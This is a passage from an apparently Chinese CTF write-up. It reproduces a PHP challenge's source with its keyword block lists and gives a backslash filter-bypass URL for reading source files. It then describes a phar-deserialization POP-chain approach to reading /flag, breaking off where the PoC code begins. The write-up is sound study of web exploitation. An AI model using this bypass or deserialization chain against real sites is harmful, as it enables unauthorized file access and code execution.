<span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>; <span class="comment">//获取文件名称</span></div><div class="line">                $dir =<span class="string">"./"</span>;  <span class="comment">//相对于网站根目录的下载目录路径</span></div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>; <span class="comment">//当前域名</span></div><div class="line">                <span class="comment">//判断如果文件存在,则跳转到下载路径</span></div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );    </div><div class="line"></div><div class="line">                    <span class="comment">//告诉浏览器这是一个文件流格式的文件</span></div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    <span class="comment">//请求范围的度量单位</span></div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    <span class="comment">//Content-Length是指定包含于请求或响应中数据的字节长度</span></div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    <span class="comment">//用来告诉浏览器，文件是可以当做附件被下载，下载后的文件名称为$file_name该变量的值。</span></div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );    </div><div class="line"></div><div class="line">                    <span class="comment">//读取文件内容并直接输出到浏览器</span></div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//return safe name</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</div><div class="line">    $string = str_replace(<span class="string">'%20'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%27'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%2527'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'*'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"'"</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">';'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"&#123;"</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&#125;'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</div><div class="line">    <span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>其中可以利用<code>$string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);</code>进行文件下载绕过，绕过方法如下：</strong></p><p><strong><code>/download.php?name=ind\\ex</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/X6zYCWVL0ipY.png?imageslim" alt="mark"></p><p><strong>通过文件读取和文件下载结合获取源代码：</strong></p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </div><div class="line"><span class="keyword">include</span> <span class="string">'base.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>base.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">    session_start(); </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;!DOCTYPE html&gt; </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt; </div><div class="line">    &lt;title&gt;upload_or_not&lt;/title&gt; </div><div class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt; </div><div class="line">    &lt;script src=<span class="string">"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt; </div><div class="line">    &lt;script src=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">    &lt;nav class="navbar navbar-default" role="navigation"&gt; </div><div class="line">        &lt;div class="container-fluid"&gt; </div><div class="line">        &lt;div class="navbar-header"&gt; </div><div class="line">            &lt;a class="navbar-brand" href="index.php"&gt;首页&lt;/a&gt; </div><div class="line">        &lt;/div&gt; </div><div class="line">            &lt;ul class="nav navbar-nav navbra-toggle"&gt; </div><div class="line">                &lt;li class="active"&gt;&lt;a href="file.php?file="&gt;查看文件&lt;/a&gt;&lt;/li&gt; </div><div class="line">                &lt;li&gt;&lt;a href=<span class="string">"upload_file.php"</span>&gt;上传文件&lt;/a&gt;&lt;/li&gt;</div><div class="line">                &lt;li&gt;&lt;a href=<span class="string">"download.php"</span>&gt;下载文件&lt;/a&gt;&lt;/li&gt;</div><div class="line">            &lt;/ul&gt; </div><div class="line">            &lt;ul class="nav navbar-nav navbar-right"&gt; </div><div class="line">                &lt;li&gt;&lt;a href="index.php"&gt;&lt;span class="glyphicon glyphicon-user"&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; </div><div class="line">            &lt;/ul&gt; </div><div class="line">        &lt;/div&gt; </div><div class="line">    &lt;/nav&gt; </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt; </div><div class="line">&lt;!--flag is in /flag--&gt;</div></pre></td></tr></table></figure><p><strong>file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </div><div class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </div><div class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</div><div class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\/|\.\.|flag/i'</span>,$file)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>); </div><div class="line">&#125;<span class="keyword">elseif</span>(!preg_match(<span class="string">'/\//i'</span>,$file))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">&#125;</div><div class="line">$show = <span class="keyword">new</span> Show(); </div><div class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </div><div class="line">    $show-&gt;source = $file; </div><div class="line">    $show-&gt;_show(); </div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </div><div class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//show_source(__FILE__); </span></div><div class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </div><div class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </div><div class="line">error_reporting(<span class="number">0</span>); </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]).<span class="string">".jpg"</span>; </div><div class="line">    <span class="comment">//mkdir("upload",0777); </span></div><div class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </div><div class="line">        unlink($filename); </div><div class="line">    &#125; </div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </div><div class="line">        upload_file_do(); </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </div><div class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </div><div class="line">    $extension = end($temp); </div><div class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </div><div class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> &#123; </div><div class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>upload_file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </div><div class="line">upload_file(); </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">&lt;meta charest=<span class="string">"utf-8"</span>&gt; </div><div class="line">&lt;title&gt;文件上传&lt;/title&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">&lt;div align = <span class="string">"center"</span>&gt; </div><div class="line">        &lt;h1&gt;上传的文件保存在/upload/md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]).<span class="string">".jpg"</span>&lt;/h1&gt; </div><div class="line">&lt;/div&gt; </div><div class="line">&lt;style&gt; </div><div class="line">    p&#123; margin:<span class="number">0</span> auto&#125; </div><div class="line">&lt;/style&gt; </div><div class="line">&lt;div&gt; </div><div class="line">&lt;form action=<span class="string">"upload_file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt; </div><div class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名:&lt;/label&gt; </div><div class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt; </div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt; </div><div class="line">&lt;/div&gt;     </div><div class="line"></div><div class="line"></div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;pre&gt;    </div><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span>    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $source;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $params;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $test;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;    </div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>代码审计后发现不能通过文件读取和文件下载直接获取flag，因为这里的过滤无法绕过</strong></p><p><strong>通过class.php代码猜测题目应该是考察的应该是php反序列化漏洞,但是并没有找到unserialize函数,不过发现file.php当中以下的代码可能存在phar反序列化漏洞的问题，php一些函数在使用phar伪协议解析phar文件时，会对phar文件当中的meta-data部分进行反序列化，其中<code>file_exists</code>函数就是其中之一</strong><br><img src="http://pic.c1imber.top/blog/20191019/Tbaro30aL4gW.png?imageslim" alt="mark"></p><p><strong>所以这道题的正确思路是应该是通过phar反序列化获取flag,思路如下：</strong></p><p><strong>构造pop链，生成phar文件，上传-&gt;通过文件读取，使用phar伪协议解析上传的phar文件-&gt;触发file_exists函数，产生php反序列化漏洞-&gt;通过php反序列化获取flag</strong></p><p><strong>构造pop链，生成phar文件：poc如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div 